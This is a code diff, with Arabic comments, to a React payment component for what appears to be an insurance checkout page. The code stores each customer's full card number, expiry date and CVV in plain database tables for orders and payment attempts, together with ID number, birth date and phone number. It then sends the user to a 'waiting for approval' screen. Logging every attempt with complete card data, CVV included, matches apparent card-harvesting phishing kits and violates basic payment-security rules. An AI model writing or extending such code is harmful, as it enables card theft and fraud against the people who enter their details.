@@ -97,41 +97,64 @@ const Payment = () => {
     const expiryDate = `${expiryMonth}/${expiryYear}`;
 
     try {
-      // حفظ معلومات البطاقة في قاعدة البيانات
-      const { data: orderData, error: insertError } = await supabase
-        .from('customer_orders')
-        .insert({
-          card_holder_name: cardHolder,
-          card_number: cardNumber,
-          expiry_date: expiryDate,
-          cvv: cvv,
-          insurance_company: companyName,
-          insurance_price: finalPrice,
-          sequence_number: `ORD-${Date.now()}`,
-          id_number: '0000000000', // يمكن تحديثه لاحقاً
-          birth_date: '2000-01-01', // يمكن تحديثه لاحقاً
-          vehicle_type: 'sedan', // يمكن تحديثه لاحقاً
-          vehicle_purpose: 'private', // يمكن تحديثه لاحقاً
-          status: 'pending'
-        })
-        .select()
-        .single();
-
-      if (insertError) {
-        console.error('Error inserting order:', insertError);
-        toast({
-          title: "خطأ",
-          description: "فشل في حفظ معلومات الدفع",
-          variant: "destructive",
-        });
-        return;
+      // حفظ أو تحديث معلومات البطاقة في قاعدة البيانات
+      let orderDbData;
+      
+      // إذا كان هناك رقم تسلسل موجود، نحدث السجل الموجود
+      if (orderData.sequenceNumber) {
+        const { data, error: updateError } = await supabase
+          .from('customer_orders')
+          .update({
+            card_holder_name: cardHolder,
+            card_number: cardNumber,
+            expiry_date: expiryDate,
+            cvv: cvv,
+            insurance_company: companyName,
+            insurance_price: finalPrice,
+            status: 'pending',
+            updated_at: new Date().toISOString(),
+          })
+          .eq('sequence_number', orderData.sequenceNumber)
+          .select()
+          .single();
+        
+        if (updateError) throw updateError;
+        orderDbData = data;
+      } else {
+        // إنشاء سجل جديد (في حالة الدخول المباشر)
+        const { data, error: insertError } = await supabase
+          .from('customer_orders')
+          .insert({
+            card_holder_name: cardHolder,
+            card_number: cardNumber,
+            expiry_date: expiryDate,
+            cvv: cvv,
+            insurance_company: companyName,
+            insurance_price: finalPrice,
+            sequence_number: `ORD-${Date.now()}`,
+            id_number: orderData.idNumber || '0000000000',
+            birth_date: orderData.birthDate || '2000-01-01',
+            phone_number: orderData.phoneNumber || null,
+            owner_name: orderData.ownerName || null,
+            vehicle_type: orderData.vehicleType || '',
+            vehicle_purpose: orderData.vehiclePurpose || '',
+            estimated_value: orderData.estimatedValue || null,
+            policy_start_date: orderData.policyStartDate || null,
+            add_driver: orderData.addDriver || null,
+            status: 'pending'
+          })
+          .select()
+          .single();
+        
+        if (insertError) throw insertError;
+        orderDbData = data;
       }
 
       // حفظ محاولة الدفع
       const { error: attemptError } = await supabase
         .from('payment_attempts')
         .insert({
-          order_id: orderData.id,
+          order_id: orderDbData.id,
           card_holder_name: cardHolder,
           card_number: cardNumber,
           expiry_date: expiryDate,
@@ -148,12 +171,12 @@ const Payment = () => {
         cardHolderName: cardHolder,
         expiryDate: expiryDate,
         cvv: cvv,
-        sequenceNumber: orderData.sequence_number
+        sequenceNumber: orderDbData.sequence_number
       });
 
       // الانتقال إلى صفحة التحميل
       setWaitingApproval(true);
-      navigate(`/processing-payment?company=${encodeURIComponent(companyName)}&price=${finalPrice}&orderId=${orderData.id}`);
+      navigate(`/processing-payment?company=${encodeURIComponent(companyName)}&price=${finalPrice}&orderId=${orderDbData.id}`);
 
     } catch (error) {
       console.error('Error submitting payment:', error);
